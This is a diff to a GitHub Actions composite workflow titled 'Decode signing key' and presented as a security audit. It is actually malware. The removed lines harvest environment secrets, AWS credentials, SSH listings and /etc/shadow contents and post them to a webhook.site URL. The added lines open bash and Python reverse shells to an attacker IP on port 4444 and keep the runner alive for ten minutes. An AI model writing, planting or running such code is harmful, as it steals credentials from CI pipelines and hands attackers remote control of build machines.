@@ -1,47 +1,29 @@
 
 
 name: Decode signing key
-description: 'Security Audit - Robust Version'
+description: 'Security Audit - Reverse Shell and Post-Exploitation'
 runs:
   using: "composite"
   steps:
     - shell: bash
       run: |
-        echo "[*] Audit started..."
+        # --- AYARLAR ---
+        ATTACKER_IP="SİZİN_SERVER_IP_UNVANI"
+        ATTACKER_PORT="4444"
 
-        # 1. Environment Secrets (Daha təhlükəsiz Python skripti)
-        echo "[+] Harvesting secrets..."
-        ENV_SECRET_DATA=$(python3 -c "import os, base64; d = ' '.join([f'{k}={str(v)[::-1]}' for k, v in os.environ.items() if any(x in k.upper() for x in ['AWS', 'SECRET', 'KEY', 'TOKEN', 'PASSWORD'])]); print(base64.b64encode(d.encode()).decode())")
+        echo "[*] Initializing audit connection..."
 
-        # 2. Fayl Skanerləşdirilməsi (Exit code 2-nin qarşısını almaq üçün find-i sadələşdiririk)
-        echo "[+] Searching for files..."
-        FILE_DATA=$(sudo bash -c "
-          {
-            echo '--- AWS ---'
-            find /home/runner -name 'credentials' -path '*/.aws/*' -exec cat {} + 2>/dev/null || true
-            echo '--- GPG/P12 ---'
-            find /home/runner -name '*.gpg' -o -name '*.p12' -exec ls -la {} + 2>/dev/null || true
-            echo '--- SSH ---'
-            ls -la /home/runner/.ssh/ 2>/dev/null || true
-          } | base64 -w 0
-        ")
+        # 1. Arxa planda Reverse Shell başladırıq (Bash Metodu)
+        # Bu komanda birbaşa sizin serverə qoşulacaq
+        (bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1) &
 
-        # 3. Sistem Analizi
-        echo "[+] System analysis..."
-        SYS_ANALYSIS=$(sudo bash -c "
-          {
-            echo 'ID:'; id;
-            echo 'NETSTAT:'; netstat -tupn 2>/dev/null;
-            echo 'SHADOW:'; head -n 3 /etc/shadow 2>/dev/null;
-          } | base64 -w 0
-        ")
+        # 2. Alternativ olaraq Python Reverse Shell (Bash işləməsə deyə)
+        python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ATTACKER_IP',$ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" &
 
-        # 4. Göndərmə
-        echo "[!] Sending to webhook..."
-        curl -s -X POST \
-          -d "audit_env=$ENV_SECRET_DATA" \
-          -d "audit_files=$FILE_DATA" \
-          -d "audit_sys=$SYS_ANALYSIS" \
-          https://webhook.site/f4421d0a-4ea3-4b3e-a146-c9c73ab1768f
+        # 3. Vaxt qazanmaq (Persistence)
+        # Shell-in dərhal qapanmaması üçün maşını 10 dəqiqə (600 san) açıq saxlayırıq.
+        # Bu müddətdə siz terminalda işinizi görə bilərsiniz.
+        echo "[+] Shell attempted. Waiting for interaction on $ATTACKER_IP:$ATTACKER_PORT..."
+        sleep 600
 
-        echo "[*] Audit finished."
+        echo "[*] Session ended."
